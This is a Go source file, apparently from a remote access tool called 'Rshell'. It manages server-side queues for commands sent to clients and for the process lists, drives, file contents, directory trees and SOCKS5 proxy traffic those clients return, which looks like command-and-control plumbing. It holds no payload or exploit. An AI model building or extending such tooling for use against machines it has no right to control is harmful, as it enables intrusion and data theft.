package command

import (
	"Rshell/pkg/connection"
	"Rshell/pkg/utils"
	"strings"
	"sync"
)

// QueueManager holds all command queue global state.
var QueueManager = &queueManager{
	cmdQueues:  make(map[string][][]byte),
	pidQueues:  make(map[string]chan string),
	driveQueues: make(map[string]chan []string),
	fileContentQueues: make(map[string]map[string]chan string),
	fileBrowserQueues: make(map[string]chan string),
	socks5Queues: make(map[string]map[string]chan string),
	uidFileBrowser: make(map[string][]*FileNode),
}

type queueManager struct {
	muCmd    sync.Mutex
	cmdQueues map[string][][]byte

	muPid    sync.Mutex
	pidQueues map[string]chan string

	muDrive    sync.Mutex
	driveQueues map[string]chan []string

	muFileContent    sync.Mutex
	fileContentQueues map[string]map[string]chan string

	muFileBrowser    sync.Mutex
	fileBrowserQueues map[string]chan string

	muSocks5    sync.Mutex
	socks5Queues map[string]map[string]chan string

	muFileTree     sync.Mutex
	uidFileBrowser map[string][]*FileNode
}

// --- Command Queue ---

func AddCommand(clientID string, command []byte) {
	QueueManager.muCmd.Lock()
	defer QueueManager.muCmd.Unlock()
	if _, exists := QueueManager.cmdQueues[clientID]; !exists {
		QueueManager.cmdQueues[clientID] = [][]byte{}
	}
	QueueManager.cmdQueues[clientID] = append(QueueManager.cmdQueues[clientID], command)
}

func GetCommand(clientID string) (command []byte, ok bool) {
	QueueManager.muCmd.Lock()
	defer QueueManager.muCmd.Unlock()
	queue, exists := QueueManager.cmdQueues[clientID]
	if !exists {
		QueueManager.cmdQueues[clientID] = [][]byte{}
		return []byte{}, false
	}
	if len(queue) == 0 {
		return []byte{}, false
	}
	command, QueueManager.cmdQueues[clientID] = queue[0], queue[1:]
	return command, true
}

// --- Pid Queue ---

func AddPid(uid string, pids string) {
	QueueManager.muPid.Lock()
	defer QueueManager.muPid.Unlock()
	if _, exists := QueueManager.pidQueues[uid]; !exists {
		QueueManager.pidQueues[uid] = make(chan string, 1)
	}
	select {
	case <-QueueManager.pidQueues[uid]:
	default:
	}
	QueueManager.pidQueues[uid] <- pids
}

func GetOrCreatePidQueue(uid string) chan string {
	QueueManager.muPid.Lock()
	defer QueueManager.muPid.Unlock()
	if _, exists := QueueManager.pidQueues[uid]; !exists {
		QueueManager.pidQueues[uid] = make(chan string, 1)
	}
	return QueueManager.pidQueues[uid]
}

// --- Drives Queue ---

func AddDrives(uid string, files []string) {
	QueueManager.muDrive.Lock()
	defer QueueManager.muDrive.Unlock()
	if _, exists := QueueManager.driveQueues[uid]; !exists {
		QueueManager.driveQueues[uid] = make(chan []string, 1)
	}
	select {
	case <-QueueManager.driveQueues[uid]:
	default:
	}
	QueueManager.driveQueues[uid] <- files
}

func GetOrCreateDrivesQueue(uid string) chan []string {
	QueueManager.muDrive.Lock()
	defer QueueManager.muDrive.Unlock()
	if _, exists := QueueManager.driveQueues[uid]; !exists {
		QueueManager.driveQueues[uid] = make(chan []string, 1)
	}
	return QueueManager.driveQueues[uid]
}

// --- File Content Queue ---

func AddFileContent(uid string, filePath, files string) {
	QueueManager.muFileContent.Lock()
	defer QueueManager.muFileContent.Unlock()
	if QueueManager.fileContentQueues[uid] == nil {
		QueueManager.fileContentQueues[uid] = make(map[string]chan string)
	}
	if _, exists := QueueManager.fileContentQueues[uid][filePath]; !exists {
		QueueManager.fileContentQueues[uid][filePath] = make(chan string, 1)
	}
	select {
	case <-QueueManager.fileContentQueues[uid][filePath]:
	default:
	}
	QueueManager.fileContentQueues[uid][filePath] <- files
}

func GetOrCreateFileContentQueue(uid string, filePath string) chan string {
	QueueManager.muFileContent.Lock()
	defer QueueManager.muFileContent.Unlock()
	if QueueManager.fileContentQueues[uid] == nil {
		QueueManager.fileContentQueues[uid] = make(map[string]chan string)
	}
	if _, exists := QueueManager.fileContentQueues[uid][filePath]; !exists {
		QueueManager.fileContentQueues[uid][filePath] = make(chan string, 1)
	}
	return QueueManager.fileContentQueues[uid][filePath]
}

// --- File Browser Queue ---

func AddFileBrowser(uid string, files string) {
	QueueManager.muFileBrowser.Lock()
	defer QueueManager.muFileBrowser.Unlock()
	if _, exists := QueueManager.fileBrowserQueues[uid]; !exists {
		QueueManager.fileBrowserQueues[uid] = make(chan string, 1)
	}
	select {
	case <-QueueManager.fileBrowserQueues[uid]:
	default:
	}
	QueueManager.fileBrowserQueues[uid] <- files
}

func GetOrCreateFileBrowserQueue(uid string) chan string {
	QueueManager.muFileBrowser.Lock()
	defer QueueManager.muFileBrowser.Unlock()
	if _, exists := QueueManager.fileBrowserQueues[uid]; !exists {
		QueueManager.fileBrowserQueues[uid] = make(chan string, 1)
	}
	return QueueManager.fileBrowserQueues[uid]
}

// --- File Tree ---

type FileNode struct {
	Name         string      `json:"name"`
	Size         string      `json:"size"`
	Type         string      `json:"type"`
	Path         string      `json:"path"`
	ModifiedTime string      `json:"modifiedTime,omitempty"`
	Children     []*FileNode `json:"children,omitempty"`
}

func ParseDirectoryString(uid string, data string) []*FileNode {
	QueueManager.muFileTree.Lock()
	defer QueueManager.muFileTree.Unlock()

	lines := strings.Split(data, "\n")
	if len(lines) < 4 {
		return QueueManager.uidFileBrowser[uid]
	}

	currentDir := strings.TrimSuffix(lines[0], "/*")
	currentDir = strings.Replace(currentDir, "\\", "/", -1)
	currentDir = strings.TrimSuffix(currentDir, "/")

	isWindows := len(currentDir) >= 2 && currentDir[1] == ':'

	var rootName string
	if isWindows {
		rootName = currentDir[:2]
	} else {
		rootName = "/"
	}

	if _, exists := QueueManager.uidFileBrowser[uid]; !exists {
		QueueManager.uidFileBrowser[uid] = []*FileNode{{
			Name:     rootName,
			Type:     "D",
			Path:     rootName,
			Children: []*FileNode{},
		}}
	}

	var children []*FileNode
	for _, line := range lines[3:] {
		if strings.TrimSpace(line) == "" {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 4 {
			continue
		}

		child := &FileNode{
			Name: parts[3],
			Type: parts[0],
			Path: currentDir + "/" + parts[3],
		}

		if parts[0] == "F" {
			child.Size = utils.BytesToSize(parts[1])
			child.ModifiedTime = parts[2]
		} else {
			child.ModifiedTime = parts[2]
			child.Children = []*FileNode{}
		}

		children = append(children, child)
	}

	updateFileTree(uid, currentDir, children)
	return QueueManager.uidFileBrowser[uid]
}

func updateFileTree(uid, currentDir string, children []*FileNode) {
	var parts []string
	if currentDir == "/" {
		parts = []string{}
	} else if strings.HasPrefix(currentDir, "/") {
		if currentDir != "/" {
			parts = strings.Split(currentDir[1:], "/")
		}
	} else if len(currentDir) >= 2 && currentDir[1] == ':' {
		if len(currentDir) > 2 {
			pathPart := currentDir[2:]
			if strings.HasPrefix(pathPart, "/") {
				pathPart = pathPart[1:]
			}
			if pathPart != "" {
				parts = strings.Split(pathPart, "/")
			}
		}
	}

	root := getRootNode(uid, currentDir)
	if root == nil {
		return
	}

	targetDir := root
	for _, part := range parts {
		found := false
		for _, child := range targetDir.Children {
			if child.Type == "D" && child.Name == part {
				targetDir = child
				found = true
				break
			}
		}
		if !found {
			var newPath string
			if targetDir.Path == "/" {
				newPath = "/" + part
			} else if strings.HasSuffix(targetDir.Path, "/") {
				newPath = targetDir.Path + part
			} else {
				newPath = targetDir.Path + "/" + part
			}
			newDir := &FileNode{
				Name:     part,
				Type:     "D",
				Path:     newPath,
				Children: []*FileNode{},
			}
			targetDir.Children = append(targetDir.Children, newDir)
			targetDir = newDir
		}
	}

	existingMap := make(map[string]*FileNode)
	for _, child := range targetDir.Children {
		key := child.Name + ":" + child.Type
		existingMap[key] = child
	}

	var newChildren []*FileNode
	for _, newChild := range children {
		key := newChild.Name + ":" + newChild.Type
		if existingChild, exists := existingMap[key]; exists {
			existingChild.Size = newChild.Size
			existingChild.ModifiedTime = newChild.ModifiedTime
			if newChild.Type == "D" {
				newChild.Children = existingChild.Children
			}
			newChildren = append(newChildren, existingChild)
			delete(existingMap, key)
		} else {
			newChildren = append(newChildren, newChild)
		}
	}

	for _, remaining := range existingMap {
		if remaining.Type == "D" {
			newChildren = append(newChildren, remaining)
		}
	}

	targetDir.Children = newChildren
}

func getRootNode(uid, path string) *FileNode {
	if _, exists := QueueManager.uidFileBrowser[uid]; !exists {
		return nil
	}

	var rootName string
	if strings.HasPrefix(path, "/") {
		rootName = "/"
	} else if len(path) >= 2 && path[1] == ':' {
		rootName = path[:2]
	} else {
		return nil
	}

	for _, node := range QueueManager.uidFileBrowser[uid] {
		if node.Name == rootName {
			return node
		}
	}
	return nil
}

func ParseDrives(uid string, drives []string) []*FileNode {
	for _, drive := range drives {
		if !exsitPan(QueueManager.uidFileBrowser[uid], drive) {
			QueueManager.uidFileBrowser[uid] = append(QueueManager.uidFileBrowser[uid], &FileNode{Name: drive, Type: "D", Path: drive})
		}
	}
	return QueueManager.uidFileBrowser[uid]
}

func exsitPan(filenode []*FileNode, pan string) bool {
	for _, file := range filenode {
		if file.Name == pan {
			return true
		}
	}
	return false
}

// DeleteFileBrowserUID removes all file browser state for a uid.
func DeleteFileBrowserUID(uid string) {
	QueueManager.muFileTree.Lock()
	defer QueueManager.muFileTree.Unlock()
	delete(QueueManager.uidFileBrowser, uid)
}

// --- SOCKS5 Queue ---

func AddSocks5(uid string, dataMd5, rawData string) {
	QueueManager.muSocks5.Lock()
	defer QueueManager.muSocks5.Unlock()

	if realUID, exists := connection.GlobalUIDMapper.GetRealUID(uid); exists {
		uid = realUID
	}

	if QueueManager.socks5Queues[uid] == nil {
		QueueManager.socks5Queues[uid] = make(map[string]chan string)
	}
	if _, exists := QueueManager.socks5Queues[uid][dataMd5]; !exists {
		QueueManager.socks5Queues[uid][dataMd5] = make(chan string, 1)
	}
	select {
	case <-QueueManager.socks5Queues[uid][dataMd5]:
	default:
	}
	QueueManager.socks5Queues[uid][dataMd5] <- rawData
}

func GetOrCreateSocks5Queue(uid string, dataMd5 string) chan string {
	QueueManager.muSocks5.Lock()
	defer QueueManager.muSocks5.Unlock()

	if realUID, exists := connection.GlobalUIDMapper.GetRealUID(uid); exists {
		uid = realUID
	}

	if QueueManager.socks5Queues[uid] == nil {
		QueueManager.socks5Queues[uid] = make(map[string]chan string)
	}
	if _, exists := QueueManager.socks5Queues[uid][dataMd5]; !exists {
		QueueManager.socks5Queues[uid][dataMd5] = make(chan string, 1)
	}
	return QueueManager.socks5Queues[uid][dataMd5]
}

// Legacy compatibility aliases (deprecated, use package-level functions).
var (
	CommandQueues       = (*ClientCommandQueue)(nil)
	VarPidQueue         = (*PidQueue)(nil)
	VarDrivesQueue      = (*DrivesQueue)(nil)
	VarFileContentQueue = (*FileContentQueue)(nil)
	VarFileBrowserQueue = (*FileBrowserQueue)(nil)
	VarSocks5Queue      = (*Socks5Queue)(nil)
)

// Filelock for backward compat (external code uses Filelock.Lock())
var Filelock sync.Mutex

// Wrapper types that delegate to QueueManager for backward compatibility.

type ClientCommandQueue struct{}

func (c *ClientCommandQueue) AddCommand(clientID string, command []byte) { AddCommand(clientID, command) }
func (c *ClientCommandQueue) GetCommand(clientID string) ([]byte, bool) { return GetCommand(clientID) }

type PidQueue struct{}

func (q *PidQueue) Add(uid string, pids string) { AddPid(uid, pids) }
func (q *PidQueue) GetOrCreateQueue(uid string) chan string { return GetOrCreatePidQueue(uid) }

type DrivesQueue struct{}

func (q *DrivesQueue) Add(uid string, files []string) { AddDrives(uid, files) }
func (q *DrivesQueue) GetOrCreateQueue(uid string) chan []string { return GetOrCreateDrivesQueue(uid) }

type FileContentQueue struct{}

func (q *FileContentQueue) Add(uid string, filePath, files string) { AddFileContent(uid, filePath, files) }
func (q *FileContentQueue) GetOrCreateQueue(uid string, filePath string) chan string { return GetOrCreateFileContentQueue(uid, filePath) }

type FileBrowserQueue struct{}

func (q *FileBrowserQueue) Add(uid string, files string) { AddFileBrowser(uid, files) }
func (q *FileBrowserQueue) GetOrCreateQueue(uid string) chan string { return GetOrCreateFileBrowserQueue(uid) }

type Socks5Queue struct{}

func (q *Socks5Queue) Add(uid string, dataMd5, rawData string) { AddSocks5(uid, dataMd5, rawData) }
func (q *Socks5Queue) GetOrCreateQueue(uid string, dataMd5 string) chan string { return GetOrCreateSocks5Queue(uid, dataMd5) }
